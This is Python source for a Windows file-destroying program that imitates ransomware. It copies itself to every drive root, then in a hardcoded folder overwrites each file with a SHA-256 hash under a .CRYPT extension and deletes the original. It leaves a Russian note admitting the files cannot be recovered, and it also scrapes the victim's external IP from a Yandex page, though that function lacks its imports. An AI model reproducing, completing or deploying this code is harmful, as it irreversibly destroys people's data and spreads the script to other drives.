import os, sys, shutil, hashlib


def get_ip():
    try:
        url = urlopen('https://yandex.ru/internet/')
        soup = BeautifulSoup(url, 'html.parser')
        out_str = soup.find('div', class_='client__desc')
        out_str = str(out_str)
        ip = []

        for symbol in out_str:
            if '1234567890.'.find(symbol) != -1:
                ip.append(symbol)

        outside_ip = ''.join(ip)
    except:
        pass


def banner():
    pass


def check_disk():
    for disk_letter in "CDEFGHIJKLMNOPQRSTYVWXYZ":
        try:
            DISK_PATH = disk_letter + "://"
            if os.path.isdir(DISK_PATH):
                shutil.copy(sys.argv[0], DISK_PATH)
            else:
                    pass
        except PermissionError:
                pass
    payload = Payload()
    #payload.get_desktop_path()
    payload.crypto_table()


class Payload():
    def __init__(self):
        pass

    def get_desktop_path(self):
        if os.getcwd() != "C://Users//" + str(os.getlogin()) + '//Desktop':
            os.chdir("C://Users//" + str(os.getlogin()) + '//Desktop')
            files = os.listdir()
            return files
        else:
            pass

    def crypto_table(self):
        DESKTOP_PATH = "C://Users//" + str(os.getlogin()) + '//Desktop'
        os.chdir("R://Games//AXXX//test//")
        files = os.listdir("R://Games//AXXX//test//")
        length_range = len(files)

        for file in files:
            try:
                with open(file, 'r') as f:
                    data = f.read()
                    f.close()
                with open(file.split(".")[0] + ".CRYPT", 'w') as f:
                    #ASCII_DATA = ''.join(c for c in data if c in string.ascii_letters)
                    HASH_DATA = hashlib.sha256(str(data).encode('utf-8')).hexdigest()
                    f.write(HASH_DATA)
                    f.close()
                os.remove(file)

            except UnicodeDecodeError:
                with open(file.split(".")[0] + ".CRYPT", 'w') as f:
                    f.write("RUSSIAN LETTERS ARE NOT ENCODING !!!")
                    f.close()
                os.remove(file)

            except PermissionError:
                pass

        with open("ПРОЧИТАЙ_МЕНЯ.txt", 'w') as report:
            report.write("ВАШИ ФАЙЛЫ В ДАННОЙ ДИРЕКТОРИИ БЫЛИ ЗАШИФРОВАНЫ АЛГОРИТМОМ SHA-256.\n Файлы, содержащие русские символы были игнорированы, просто поставьте нужное расширение на такой файл.\n Сожалеем, но остальные файлы спасти не удалось\n\n\n -- Для человеческой глупости нет патча. -- Кевин Митник.  ")
            report.close()



def main():
    if os.name == "nt":
        check_disk()
    elif os.name == "posix":
        pass
    else:
            pass


if __name__ == "__main__":
    main()
